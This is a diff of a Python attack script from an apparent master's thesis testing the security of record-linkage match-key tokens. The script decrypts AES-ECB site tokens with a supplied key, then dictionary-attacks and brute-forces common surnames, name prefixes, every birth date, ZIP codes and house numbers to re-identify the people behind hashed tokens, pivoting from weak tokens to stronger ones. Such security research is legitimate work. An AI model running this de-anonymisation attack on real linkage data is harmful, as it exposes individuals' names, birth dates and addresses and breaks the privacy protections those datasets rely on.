@@ -1,4 +1,30 @@
 #!/usr/bin/env python3
+"""
+Token Escalation Attack Script (Dictionary Mode)
+Master Thesis: Record Linkage with Match Key Algorithms - Is it secure?
+Author: Babett Müller
+
+Description:
+    This script implements a "Dictionary Attack" on encrypted match key tokens.
+    It relies on auxiliary knowledge (frequency lists of names, addresses) to 
+    re-identify low-entropy tokens first (T7 in this specific path), and then 
+    uses the recovered information to "pivot" (escalate) to higher-entropy tokens.
+
+    Attack Path Implemented:
+    1. T7 (Low Entropy): Last Name + First 3 Letters + Gender + DOB
+       -> Strategy: Dictionary Attack on Surnames + 3-letter prefixes.
+    2. T4 (High Entropy): Last Name + Full First Name + Gender + DOB
+       -> Strategy: Pivot from T7. Use recovered (LN, Prefix, DOB) to filter First Name candidates.
+    3. T3 (Medium Entropy): Last Name + First Name + DOB + ZIP3
+       -> Strategy: Pivot from T4. Brute-force the 3-digit ZIP code (000-999).
+    4. T9 (High Entropy): First Name + Address
+       -> Strategy: Pivot from T4. Use recovered First Name to test top addresses.
+
+Usage:
+    python3 old_approaches/high_entropy_old.py --in encrypted_tokens.csv --out results.txt \
+        --site-key "KEY" (--master-salt "SALT") --columns "T7,T4,T3,T9"
+"""
+
 import argparse
 import base64
 import csv
@@ -15,57 +41,66 @@ import pandas as pd
 from faker import Faker
 import itertools
 
-# Calculate all possible birthdays for ages 18 to 80
-today = date.today()
-min_year = today.year - 80
-max_year = today.year - 18
+# ==============================================================================
+# CONFIGURATION & CONSTANTS
+# ==============================================================================
 
-# =============================
-# Normalization / helpers
-# =============================
+# Date range for brute-forcing DOBs (18 to 80 years old)
+TODAY = date.today()
+MIN_YEAR = TODAY.year - 80
+MAX_YEAR = TODAY.year - 18
+
+GENDERS = ["m", "f", "u"]
+
+# Global Dictionaries (Populated at runtime)
+TOP_FIRST: list = []
+TOP_LAST: list = []
+TOP_ADDRESS: list = []
+
+# ==============================================================================
+# 1. NORMALIZATION UTILITIES
+# ==============================================================================
+# These must match the normalization logic used during token generation.
+
 def norm(s: Any) -> str:
+    """Removes non-alphanumeric characters and converts to lowercase."""
     return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())
 
 def norm_gender(g: Any) -> str:
+    """Standardizes gender to 'm', 'f', or 'u'."""
     g = str(g or "").strip().lower()
     if g in ("m", "male"): return "m"
     if g in ("f", "female"): return "f"
     return "u"
 
-def norm_dob(s: Any) -> str:
-    s = str(s or "").strip()
-    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
-    for f in fmts:
-        try:
-            return datetime.strptime(s, f).strftime("%Y%m%d")
-        except ValueError:
-            pass
-    if len(s) == 8 and s.isdigit():
-        return s
-    return ""
-
-def first_initial(fn: str) -> str:
-    n = norm(fn)
-    return n[0] if n else ""
-
 def first3(fn: str) -> str:
+    """Extracts the first 3 characters of a normalized name."""
     n = norm(fn)
     return n[:3] if n else ""
 
 def split_address(address):
-    # Try German format: street name first, then number
+    """
+    Heuristic to split an address string into Street Name and House Number.
+    Crucial for T9 attacks where house numbers are iterated.
+    
+    Returns:
+        (Street, Number, FormatType)
+    """
+    # Regex for German format: "Main St. 12a"
     match_german = re.match(r"^([\w\s\-\.]+)\s+(\d+)[a-zA-Z]?", str(address))
     if match_german:
         return match_german.group(1).strip(), match_german.group(2).strip(), 'german'
-    # Try American format: number first, then street name
+        
+    # Regex for US format: "123 Main St."
     match_american = re.match(r"^(\d+)\s+([\w\s\-\.]+)", str(address))
     if match_american:
         return match_american.group(2).strip(), match_american.group(1).strip(), 'american'
-    # Only street name, no number
+        
+    # Fallback: Street only
     match_street_only = re.match(r"^([\w\s\-\.]+)$", str(address).strip())
     if match_street_only:
         return match_street_only.group(1).strip(), None, 'street_only'
-    # If none matches, return whole address and None
+        
     return str(address).strip(), None, 'unknown'
 
 def time_attack(func, *args, label=None):
@@ -77,17 +112,20 @@ def time_attack(func, *args, label=None):
         print(f"[TIMER] {label}: {elapsed:.2f} seconds")
     return result, elapsed
 
-# =============================
-# Master token functions
-# =============================
-def master_sha256(token_input: str) -> bytes:
-    return hashlib.sha256(token_input.encode("utf-8")).digest()  # 32 bytes
+# ==============================================================================
+# 2. CRYPTOGRAPHIC PRIMITIVES
+# ==============================================================================
 
 def master_hmac(master_salt: bytes, token_input: str) -> bytes:
-    return hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256).digest()  # 32 bytes
+    """HMAC-SHA256 used to generate the Master Token."""
+    return hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256).digest()
+
+def master_sha256(token_input: str) -> bytes:
+    """SHA-256 used if no master salt is provided."""
+    return hashlib.sha256(token_input.encode("utf-8")).digest()
 
 def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
-    """Accept hex or utf-8; optionally enforce expected length."""
+    """Parses hex or utf-8 strings into bytes."""
     try:
         b = bytes.fromhex(s)
     except ValueError:
@@ -96,25 +134,51 @@ def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
         raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
     return b
 
-# =============================
-# Site encryption (AES-ECB)
-# =============================
-def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
-    """Decrypt base64-encoded site token to raw 32-byte master token."""
+def aes_ecb_decrypt_b64(site_key: bytes, token_b64: str) -> bytes:
+    """
+    Decrypts the site-specific token to reveal the underlying Master Token (Hash).
+    This is the target value we are trying to crack.
+    """
     ct = base64.b64decode(token_b64)
-    if len(ct) % 16 != 0:
-        raise ValueError("Ciphertext is not a multiple of AES block size.")
-    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
+    cipher = AES.new(site_key, AES.MODE_ECB)
     pt = cipher.decrypt(ct)
-    # Expect SHA-256 output length
-    if len(pt) != 32:
-        # Some pipelines might pack more; keep it but warn upstream if needed
-        pass
     return pt
 
-# =============================
-# Token input builders
-# =============================
+# ==============================================================================
+# 3. SITE DATA LOADING
+# ==============================================================================
+
+def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
+    """Loads site tokens from a CSV file."""
+    with open(path, newline="", encoding="utf-8") as f:
+        r = csv.DictReader(f)
+        rows = list(r)
+    return {"_RAW": rows}
+
+def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
+    """Decrypts specified columns to extract Master Tokens."""
+    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
+    successes = 0
+    failures = 0
+    for row in rows:
+        for c in colnames:
+            val = (row.get(c) or "").strip()
+            if not val:
+                continue
+            try:
+                mt = aes_ecb_decrypt_b64(site_key_32, val)
+                out[c].add(mt)
+                successes += 1
+            except Exception:
+                failures += 1
+                # keep going
+    for c in colnames:
+        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (sample successes={successes}, failures={failures})")
+    return out
+
+# ==============================================================================
+# 4. TOKEN BUILDERS (ATTACK TEMPLATES)
+# ==============================================================================
 def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
     if not (ln and fn and g and dob): return ""
     return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"
@@ -131,38 +195,11 @@ def mk_T9(fn: str, address: str) -> str:
     if not (fn and address): return ""
     return f"{norm(fn)}|{norm(address)}"
 
-# =============================
-# Load and decrypt site tokens
-# =============================
-def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
-    with open(path, newline="", encoding="utf-8") as f:
-        r = csv.DictReader(f)
-        rows = list(r)
-    return {"_RAW": rows}
-
-def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
-    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
-    successes = 0
-    failures = 0
-    for row in rows:
-        for c in colnames:
-            val = (row.get(c) or "").strip()
-            if not val:
-                continue
-            try:
-                mt = aes256_ecb_decrypt_b64(site_key_32, val)
-                out[c].add(mt)
-                successes += 1
-            except Exception:
-                failures += 1
-                # keep going
-    for c in colnames:
-        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (sample successes={successes}, failures={failures})")
-    return out
-
-# =============================
-# Dictionaries
-# =============================
+# ==============================================================================
+# 5. STATIC DICTIONARY LOADING
+# ==============================================================================
+# Load "Top N" lists from text files.
+# Distribution from static files (commented out for this version).
 """with open("nachnamen.txt", "r", encoding="utf-8") as f:
     TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
 
@@ -170,46 +207,47 @@ with open("vornamen.txt", "r", encoding="utf-8") as f:
     TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
 
 with open("strassennamen.txt", "r", encoding="utf-8") as f:
-    TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-
-GENDERS = ["m","f","u"]"""
+    TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]"""
 
 # Generate 200 birthdays
 """fake = Faker()
 TOP_DOB = [fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y%m%d') for _ in range(200)]"""
 
 # =============================
-# Similiar DB
+# 6. DICTIONARY LOADING FROM FILE
 # =============================
+# Load "Top N" lists from a known distribution CSV.
+# This simulates the attacker's auxiliary knowledge (e.g., Census data).
 
-#df_distribution = pd.read_csv(r"ohio_cleaned.csv")
 df_distribution = pd.read_csv(r"known_data_clean.csv")
 
 TOP_FIRST = df_distribution["first_name"].value_counts().head(500).index.tolist()
 TOP_LAST = df_distribution["last_name"].value_counts().head(500).index.tolist()
-# TOP_DOB = df_distribution["dob"].value_counts().head(500).index.tolist()
-# TOP_YOB = df_distribution["year_of_birth"].value_counts().head(500).index.tolist()
-# TOP_ZIP = df_distribution["zip"].value_counts().head(500).index.tolist()
 TOP_ADDRESS = df_distribution["address"].value_counts().head(500).index.tolist()
-GENDERS = ["m","f","u"]
+print(f"[*] Loaded {len(TOP_FIRST)} first names, {len(TOP_LAST)} last names.")
 
 # =============================
-# Attack core
+# 7. ATTACK FUNCTIONS
 # =============================
 def attack_entropy_first_T7(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
-    """Dictionary attack against T7: ln|fi3|g|dob. Return {master_token: (ln, fi3, g, dob)}."""
+    """
+    Phase 1: Attack T7 (Last Name + First 3 Chars + Sex + DOB).
+    
+    Strategy:
+        - Iterate Top 500 Last Names.
+        - Iterate unique 3-letter prefixes derived from Top 500 First Names.
+        - Iterate Gender (3 options).
+        - Iterate all dates in the age range 18-80 (approx. 22,000 days).
+        
+    Complexity: O(Names * Prefixes * 3 * Dates)
+    """
     hits = {}
     for ln in TOP_LAST:
         # for fi3 in ("".join(comb) for comb in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=3)):
         for fi3 in (first3(fn) for fn in TOP_FIRST):     
             for g in GENDERS:
-                """for dob in TOP_DOB:
-                    inp = f"{norm(ln)}|{fi3}|{g}|{dob}"
-                    if not inp: continue
-                    mt = master_func(inp)
-                    if mt in master_tokens:
-                        hits[mt] = (norm(ln), fi3, g, dob)"""
-                for year in range(min_year, max_year + 1):
+                # Iterate Date of Births
+                for year in range(MIN_YEAR, MAX_YEAR + 1):
                     for month in range(1, 13):
                         if month in [1, 3, 5, 7, 8, 10, 12]:
                             max_day = 31
@@ -225,9 +263,11 @@ def attack_entropy_first_T7(master_func, master_tokens: Set[bytes]) -> Dict[byte
                         for day in range(1, max_day + 1):
                             dob_obj = date(year, month, day)
                             dob = dob_obj.strftime('%Y%m%d')
+                            # Construct candidate string
                             inp = f"{norm(ln)}|{fi3}|{g}|{dob}"
                             if not inp:
                                 continue
+                            # Check against encrypted database
                             mt = master_func(inp)
                             if mt in master_tokens:
                                 hits[mt] = (norm(ln), fi3, g, dob)
@@ -235,12 +275,20 @@ def attack_entropy_first_T7(master_func, master_tokens: Set[bytes]) -> Dict[byte
 
 def pivot_from_T7_to_T4(master_func, T4_master_tokens: Set[bytes], t7_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
     """
-    Use knowledge from T7 (ln|fi3|g|dob) to brute-force T4 (ln|fn|g|dob).
+    Phase 2: Pivot T7 -> T4 (Full Name Escalation).
+    
+    Strategy:
+        We now know: Last Name, Gender, DOB, and the first 3 letters of the First Name.
+        We filter the First Name dictionary to only test names that match the 3-letter prefix.
+        
+    Reduction:
+        Instead of testing 500 first names per record, we typically test < 10.
     """
     ln, fi3, g, dob = t7_hit
     out = {}
     for fn in TOP_FIRST:
-        if not fn or norm(fn)[0:3] != fi3: # Test on all names?
+        # Filter: Does candidate name match the known prefix?
+        if not fn or norm(fn)[0:3] != fi3: 
             continue
         t4_inp = mk_T4(ln, fn, g, dob)
         if not t4_inp:
@@ -252,7 +300,14 @@ def pivot_from_T7_to_T4(master_func, T4_master_tokens: Set[bytes], t7_hit: Tuple
 
 def pivot_from_T4_to_T3(master_func, T3_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
     """
-    Use knowledge from T4 (ln|fn|g|dob) to brute-force T3 (ln|fn|dob|zip3).
+    Phase 3: Pivot T4 -> T3 (ZIP Code).
+    
+    Strategy:
+        We know the full identity (Name + DOB).
+        The only unknown in T3 is the 3-digit ZIP code.
+        We brute-force the range 000-999.
+        
+    Complexity: 1000 hashes per recovered identity (Trivial).
     """
     ln, fn, g, dob = t4_hit
     out = {}
@@ -267,20 +322,18 @@ def pivot_from_T4_to_T3(master_func, T3_master_tokens: Set[bytes], t4_hit: Tuple
 
 def pivot_from_T4_to_T9(master_func, T9_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str]]:
     """
-    Use knowledge from T4 (ln|fn|g|dob) to brute-force T9 (fn|addr).
+    Phase 4: Pivot T4 -> T9 (Address).
+    
+    Strategy:
+        We iterate through the Top 500 addresses.
+        Since house numbers vary, we iterate a range (1-500) for each street name.
     """
     ln, fn, g, dob = t4_hit
     out = {}
     for address in TOP_ADDRESS:
-        """t9_inp = f"{ln}|{address}"
-        if not t9_inp:
-            continue
-        mt = master_func(t9_inp)
-        if mt in T9_master_tokens:
-            out[mt] = (ln, address)"""
         street, number, addr_type = split_address(address)
         if addr_type == 'german':
-            # German: iterate numbers
+            # Brute-force house numbers 1-500 based on street format
             for num in range(1, 501):
                 address_try = f"{street} {num}"
                 t9_inp = f"{fn}|{address_try}"
@@ -320,11 +373,12 @@ def pivot_from_T4_to_T9(master_func, T9_master_tokens: Set[bytes], t4_hit: Tuple
                 out[mt] = (fn, address_try)
     return out
 
-# =============================
-# Orchestrator
-# =============================
+# ==============================================================================
+# MAIN EXECUTION
+# ==============================================================================
+
 def run_attack(args):
-    # Master function
+    # 1. Setup Hasher (HMAC vs SHA)
     if args.master_salt:
         ms = parse_bytes(args.master_salt)  # any length ok for HMAC key
         master_func = lambda s: master_hmac(ms, s)
@@ -333,7 +387,7 @@ def run_attack(args):
         master_func = lambda s: master_sha256(s)
         print("[*] Using SHA-256(token_input) (no master salt).")
 
-    # Site key: AES-256 requires 32 bytes
+    # 2. Decrypt Site Tokens (The "Leak")
     site_key = parse_bytes(args.site_key, expect_len=32)
     print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")
 
@@ -347,6 +401,8 @@ def run_attack(args):
     if all(len(dec[c]) == 0 for c in cols):
         print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
         return
+
+    # 3. Execute Attack Chain
 
     # Phase 1: attack lowest-entropy tokens first (T1, T2)
     t7_hits = {}
@@ -393,25 +449,6 @@ def run_attack(args):
             t9_pivot_hits.update(out)
         t9_time = time.time() - start
         print(f"[TIMER] T9: {t9_time:.2f} seconds")
-
-    # Report
-    """print("\n=== RESULTS ===")
-    if t7_hits:
-        print(f"[T7] {len(t7_hits)} master tokens cracked")
-        for mt, tpl in list(t7_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi3={tpl[1]} g={tpl[2]} dob={tpl[3]}")
-    if t4_pivot_hits:
-        print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
-        for mt, tpl in list(t4_pivot_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
-    if t3_pivot_hits:
-        print(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)")
-        for mt, tpl in list(t3_pivot_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}")
-    if t9_pivot_hits:
-        print(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)")
-        for mt, tpl in list(t9_pivot_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} address={tpl[1]}")"""
 
     # Save results to a text file
     with open(args.outfile, "w", encoding="utf-8") as result_file:
